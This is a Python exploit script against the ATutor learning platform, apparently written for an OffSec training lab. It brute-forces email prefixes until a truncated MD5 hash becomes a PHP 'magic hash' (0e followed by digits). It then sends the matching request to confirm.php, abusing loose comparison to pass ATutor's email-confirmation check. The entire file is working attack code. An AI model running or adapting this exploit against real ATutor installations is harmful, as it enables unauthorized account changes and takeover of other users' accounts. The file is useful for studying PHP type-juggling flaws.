import hashlib, string, itertools, re, sys, requests

def gen_code(domain, id, date, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase,repeat=int(prefix_length))):
        words_combined = "%s@%s" % (word, domain) + date + id
        hash = hashlib.md5(words_combined.encode("latin1")).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print("(+) Found a valid email! %s@%s" % (word, domain))
            print("(+) Requests made: %d" % count)
            print("(+) Equivalent loose comparison: %s == 0\n" % (hash))
            print("(+) Founding a hash")
            email = F"{word}@{domain}"
            url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % ('atutor', email, id)
            print ("(*) Issuing update request to URL: %s" % url)
            r = requests.get(url, allow_redirects=False, proxies={'http':'http://192.168.177.1:8080'})
            if (r.status_code == 302):
                print("here")
                return (True, email, count)
            else:
                print(r.status_code)
        count += 1

def main():
    if len(sys.argv) != 5:
        print('(+) usage: %s <domain_name> <id> <creation_date> <prefix_length>' % sys.argv[0])
        print('(+) eg: %s offsec.local 3 "2018-06-10 23:59:59" 3' % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    creation_date = sys.argv[3]
    prefix_length = sys.argv[4]

    gen_code(domain, id, creation_date, prefix_length)

if __name__ == "__main__":
    main()

